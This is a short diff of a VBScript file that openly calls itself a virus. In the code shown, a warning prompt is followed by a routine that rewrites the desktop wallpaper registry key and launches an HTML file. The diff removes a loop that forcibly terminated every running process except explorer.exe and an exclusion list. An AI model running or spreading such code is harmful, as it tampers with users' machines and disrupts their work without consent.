@@ -19,30 +19,12 @@ Set Shell = CreateObject("WScript.Shell")
 
 answer = MsgBox("WARNING: THIS VIRUS CAN HARM TO YOUR COMPUTER, DO YOU WANT TO RUN THIS MALWARE?", vbExclamation + vbYesNo, "WARNING")
 
-' Function to check if an element is in an array
-Function IsInArray(item, arr)
-    Dim i
-    For i = 0 To UBound(arr)
-        If LCase(arr(i)) = LCase(item) Then
-            IsInArray = True
-            Exit Function
-        End If
-    Next
-    IsInArray = False
-End Function
-
 Function runVirus()
     wallpaperPath = scriptDir & "Wallpaper.jpg"
     htmlFilePath = scriptDir & "File.html"
 
     Shell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", wallpaperPath
     Shell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
-
-    For Each objProcess in colProcesses
-        If Not IsInArray(objProcess.Name, excludedProcesses) And Not LCase(objProcess.Name) = "explorer.exe" Then
-            objProcess.Terminate
-        End If
-    Next
 
     Shell.Run """" & htmlFilePath & """", 1, False
 End Function
